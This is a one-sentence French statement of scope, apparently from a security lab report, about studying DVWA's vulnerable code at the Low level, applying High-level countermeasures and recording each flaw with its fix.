DVWA en niveau Low, analyse du code vulnérable, application des
contre-mesures (niveau High) et consignation de chaque faille + correctif dans
ce rapport.